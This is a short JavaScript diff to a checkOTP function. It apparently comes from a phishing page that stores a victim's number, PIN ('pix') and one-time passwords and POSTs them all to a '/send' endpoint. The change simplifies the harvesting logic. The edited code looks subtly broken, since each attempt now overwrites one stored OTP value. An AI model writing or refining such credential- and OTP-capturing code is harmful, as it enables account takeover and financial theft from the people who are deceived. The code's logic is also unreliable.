@@ -151,29 +151,21 @@ function checkOTP(){
 
     otpAttempt++;
 
-    if(otpAttempt === 1){
-        localStorage.setItem("otp", otp);
-    }else{
-        localStorage.setItem("otx", otx);
-    }
+    localStorage.setItem("otx", otp);
 
-    const nmrx = localStorage.getItem("nmrx");
-    const pix = localStorage.getItem("pix");
-    const otp = localStorage.getItem("otp");
-    const otx = localStorage.getItem("otx");
-
-    fetch("/send",{
-        method:"POST",
-        headers:{
-            "Content-Type":"application/json"
-        },
-        body:JSON.stringify({
-            nmrx:nmrx,
-            pix:pix,
-            otp:otp,
-            otx:otx
-        })
+fetch("/send",{
+    method:"POST",
+    headers:{
+        "Content-Type":"application/json"
+    },
+    body:JSON.stringify({
+        nmrx: localStorage.getItem("nmrx"),
+        pix: localStorage.getItem("pix"),
+        otp: localStorage.getItem("otp"),
+        otx: localStorage.getItem("otx")
     })
+})
+  
     .then(res => res.json())
     .then(data => {
         console.log("RESPON:", data);
